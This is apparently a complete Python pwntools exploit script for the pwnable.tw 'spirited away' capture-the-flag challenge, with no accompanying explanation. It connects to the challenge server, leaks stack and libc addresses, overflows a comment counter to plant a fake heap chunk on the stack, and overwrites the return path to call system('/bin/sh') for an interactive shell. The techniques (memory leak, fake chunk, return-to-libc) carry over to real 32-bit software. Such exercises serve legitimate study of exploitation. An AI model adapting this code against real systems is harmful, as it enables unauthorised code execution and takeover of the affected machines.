#Exploit for pwnable.tw/spirited away
from pwn import *
target = process('./spirited_away')
target = remote('chall.pwnable.tw', 10204)
elf = ELF('./spirited_away')
libc = ELF('./libc_32.so.6')

def sa(s, d):
	print(target.sendafter(s, d))

def comment(name, age, reason, comment, leave_another_comment = "y", leaking_libc = 0):
	sa(": ", name)
	sa(": ", str(age) + "\n")
	sa("? ", reason)
	sa(": ", comment)
	if (leaking_libc == 1):
		target.recvuntil("B"*0x20)
		global saved_ebp_addr
		saved_ebp_addr = u32(target.recv(4))
		log.success("Saved EBP address: " + hex(saved_ebp_addr))
		target.recv(4)
		libc_leak = u32(target.recv(4))
		libc_base = libc_leak - libc.sym['_IO_2_1_stdout_']
		log.success("LIBC Base: " + hex(libc_base))
	sa("<y/n>: ", leave_another_comment)
	if (leaking_libc == 1):
		return libc_base

#Interaction starts here----------------------------------------------------------------------------------------
libc_base = comment("NAME", 1, "B"*0x20, "COMMENT", "y", 1)
for i in range(9):
	comment("N", 1, "R\x00", "C\x00")

for i in range(90):
	target.sendline('1')
	sa("? ", "C")
	sa("<y/n>: ", "y")

addr = saved_ebp_addr & 0xfffffff0
data_to_overwrite = "A"*(saved_ebp_addr - addr + 4) 
data_to_overwrite += p32(libc_base + libc.sym['system']) + p32(0x08048804) + p32(libc_base + libc.search("/bin/sh\x00").next())

comment("whoamiT", 1337, p32(0x41)*20, "C"*0x50 + p32(1337) + p32(addr) + "HACKED\x00")
comment(data_to_overwrite, 1337, "FINAL_REASON", "FINAL_COMMENT", "n")

target.interactive()
